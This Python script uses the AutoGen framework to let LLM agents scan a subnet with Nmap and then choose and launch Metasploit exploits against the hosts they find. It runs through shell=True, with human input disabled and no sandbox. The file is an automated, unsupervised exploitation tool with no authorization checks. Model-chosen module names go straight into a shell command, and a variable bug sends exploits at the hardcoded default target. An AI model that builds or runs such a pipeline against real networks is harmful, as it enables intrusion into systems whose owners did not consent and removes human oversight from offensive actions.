import argparse
import logging
import subprocess
import traceback
from datetime import datetime, timezone
from pathlib import Path
from typing import Dict, Union

from autogen import AssistantAgent, UserProxyAgent, GroupChat, GroupChatManager, runtime_logging
from typing_extensions import Annotated

from modules.CONSTANTS import NMAP_OPTIONS
from modules.configs import load_llm_config
from modules.data_formatter import get_refined_results
from modules.utils import is_termination_msg, filter_and_sort_files_by_ip, ip_in_subnet

logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)
# Start logging with logger_type and the filename to log to
logging_session_id = runtime_logging.start(config={"dbname": "logs.db"})
print("Logging session ID: " + str(logging_session_id))

# Load environment variables
BASE_DIR = Path(__file__).resolve().parent
RESULTS_DIR = BASE_DIR.parent / "results"

llm_config = load_llm_config(BASE_DIR)


# Helper Functions
def create_agent(name: str, system_message: str, description: str, temperature: float, timeout: int) -> AssistantAgent:
    """
    Helper function to create an AssistantAgent with predefined configuration.
    """
    return AssistantAgent(
        name=name,
        system_message=system_message,
        description=description,
        llm_config={
            "temperature": temperature,
            "timeout": timeout,
            "config_list": llm_config["config_list"],
        }
    )


# Agent Definitions
host_finder_agent = create_agent(
    name="host_finder_agent",
    system_message=" Discover hosts on the current network using host discovery options. Use the registered function.",
    description="Finds hosts in the network.",
    temperature=0.3,
    timeout=60
)

open_ports_finder_agent = create_agent(
    name="open_ports_finder_agent",
    system_message="Find the open ports for targets found by 'host_finder_agent' and use the registered function.",
    description="Finds open ports for each target.",
    temperature=0.3,
    timeout=60
)

vulnerability_finder_agent = create_agent(
    name="vulnerability_finder_agent",
    system_message=f"""
        Use identified hosts from 'open_ports_finder_agent' that has at least one open port and configure desired Nmap scan options:
          - {NMAP_OPTIONS["service_version"]}: Service Version Detection
          - {NMAP_OPTIONS["speed_up"]}: Speedup Scan
          - {NMAP_OPTIONS["vuln_scan"]}: Vulnerability Scan
          - {NMAP_OPTIONS["save_result"]}: Save Results
        Do not give any extra parameter then above not even the file name. Report resulted ip address in a list only and Return 'TERMINATE' when complete."
    """,
    description="Finds vulnerabilities in the network.",
    temperature=0.4,
    timeout=90
)

user_proxy = UserProxyAgent(
    name="user_proxy",
    is_termination_msg=is_termination_msg,
    human_input_mode="NEVER",
    code_execution_config={
        "work_dir": "cybersecurity",
        "use_docker": False,
    },
)


# Register Functionality
@user_proxy.register_for_execution()
@host_finder_agent.register_for_llm(
    name="perform_nmap_scan",
    description="Perform a host discovery scan using Nmap."
)
@open_ports_finder_agent.register_for_llm(
    name="perform_nmap_scan",
    description="Perform an open ports scan using Nmap."
)
@vulnerability_finder_agent.register_for_llm(
    name="perform_nmap_scan",
    description="Perform a vulnerability scan using Nmap."
)
def perform_nmap_scan(
        target: Annotated[str, "Target subnet or IP range to scan"],
        options: Annotated[str, "Options for the Nmap scan (e.g., '-A,--script=vuln')"]
) -> Union[str, Dict]:
    """
    Perform an Nmap scan using the provided target and options.

    :param target: The target IP range or address to scan.
    :param options: Space-separated Nmap options (e.g., "-A --script=vuln").
    :return: The output of the Nmap scan as a string.
    """
    if not target.strip():
        raise ValueError("The target cannot be empty.")
    if not options.strip():
        raise ValueError("The options cannot be empty.")

    try:
        all_options = options.split()
        if "-oN" in all_options:
            timestamp = datetime.now(timezone.utc).strftime("%Y-%m-%d_%H-%M-%S")
            output_file = str(RESULTS_DIR / f"nmap_scan_{timestamp}_{target}.txt")
            all_options.append(output_file)
        logger.info(f"Starting Nmap scan for target: {target} with options: {all_options} ...")

        cmd = ["nmap"] + all_options + [target]
        logger.debug(f"Constructed command: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, check=True)
        logger.info("Nmap scan completed successfully.")
        return result.stdout
    except subprocess.CalledProcessError as e:
        logger.error(f"Nmap scan failed. Stderr: {e.stderr.strip()}")
        return f"Error: {e.stderr.strip()}"
    except Exception as e:
        logger.error(f"Unexpected error during Nmap scan: {e}")
        return str(e)


def perform_nmap_scan_on_subnet(target_subnet: str):
    # Group Chat Setup
    nmap_group_chat = GroupChat(
        agents=[user_proxy, host_finder_agent, open_ports_finder_agent, vulnerability_finder_agent],
        messages=[]
    )
    nmap_manager = GroupChatManager(nmap_group_chat)

    result = user_proxy.initiate_chat(
        nmap_manager,
        message=f"Start the perform the nmap assessment on target network: {target_subnet}"
    )
    return result


def run_exploit(target, data):
    exploit_agent = create_agent(
        name="exploit_agent",
        system_message=f"Use the target {target} and data given and specify the exploit module, port, and other options to perform Metasploit tasks. Return 'TERMINATE' when complete.",
        description="Performs Metasploit exploits.",
        temperature=0.4,
        timeout=90
    )

    @user_proxy.register_for_execution()
    @exploit_agent.register_for_llm(name="perform_metasploit_task", description="Perform a Metasploit task.")
    def perform_metasploit_task(
            target: Annotated[str, "Target IP to exploit"],
            exploit: Annotated[str, "Metasploit exploit module to use"],
            port: Annotated[str, "Target port for the exploit"]
    ) -> str:
        """
        Execute a Metasploit exploit task.

        :param target: The target IP.
        :param exploit: The Metasploit exploit module.
        :param port: The target port.
        :return: Exploit result.
        """
        try:
            logger.info(f"Preparing Metasploit exploit for target {target} on port {port} using {exploit}.")
            commands = [
                f"use {exploit}",
                f"set RHOSTS {target}",
                f"set RPORT {port}",
                "check",  # Check if the target is vulnerable
                "exploit",
                "exit"
            ]
            metasploit_cmd = f'msfconsole -q -x "{"; ".join(commands)}"'

            logger.debug(f"Executing Metasploit command: {metasploit_cmd}")

            # Run the command
            result = subprocess.run(metasploit_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    text=True)

            if result.returncode != 0:
                logger.error(f"Error during Metasploit execution: {result.stderr.strip()}")
                return f"Error during Metasploit execution: {result.stderr.strip()}"

            logger.info(f"Metasploit completed successfully for exploit {exploit} on target {target}.")
            return result.stdout
        except Exception as e:
            logger.error(f"Error while executing Metasploit task: {e}")
            return str(e)

    exploit_group_chat = GroupChat(
        agents=[user_proxy, exploit_agent],
        messages=[],
        speaker_selection_method="round_robin"
    )
    exploit_manager = GroupChatManager(exploit_group_chat)
    user_proxy.initiate_chat(
        exploit_manager,
        message="Perform exploitation using the data given."
    )


def perform_metasploit_on_target(target_subnet):
    try:
        sorted_files = filter_and_sort_files_by_ip(RESULTS_DIR)
        for file_path in sorted_files:
            try:
                file_ip = file_path.stem.split("_")[-1]
                if file_ip and ip_in_subnet(file_ip, target_subnet):
                    print(f"Matching file found for target {target}: {file_path}")
                    data = get_refined_results(Path(file_path))
                    if not data:
                        print(f"No refined results for file: {file_path}. Skipping...")
                        continue

                    print(f"Starting exploit run for target {target}...")
                    run_exploit(target, data)
                    print("=" * 100)
            except Exception as e:
                print(f"Error processing file {file_path}: {e}")

    except Exception as e:
        print(f"Error processing files in directory {BASE_DIR}: {e}")


if __name__ == "__main__":
    # ==========TARGET========
    target = "192.168.100.0/24"
    # # ==========TARGET========

    parser = argparse.ArgumentParser(description="Network Scanning and Exploitation Tool")

    # Add arguments
    parser.add_argument(
        "-t", "--target",
        type=str,
        required=True,
        help="Target IP or IP range (e.g., 192.168.0.0/24)."
    )
    parser.add_argument(
        "--nmap",
        action="store_true",
        help="Perform an Nmap scan on the target."
    )
    parser.add_argument(
        "--exploit",
        action="store_true",
        default=True,
        help="Perform nmap and exploitation on the target after scanning."
    )

    args = parser.parse_args()

    try:
        if args.nmap:
            logger.info(f"Starting Nmap scan on target: {args.target}")
            perform_nmap_scan_on_subnet(args.target)

        if args.exploit:
            logger.info(f"Starting Nmap scan on target: {args.target}")
            perform_nmap_scan_on_subnet(args.target)

            logger.info(f"Starting exploitation on target: {args.target}")
            perform_metasploit_on_target(args.target)

        if not args.nmap and not args.exploit:
            logger.warning("No action specified! Use --nmap or --exploit to perform an action.")
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        print(traceback.format_exc())
    finally:
        runtime_logging.stop()
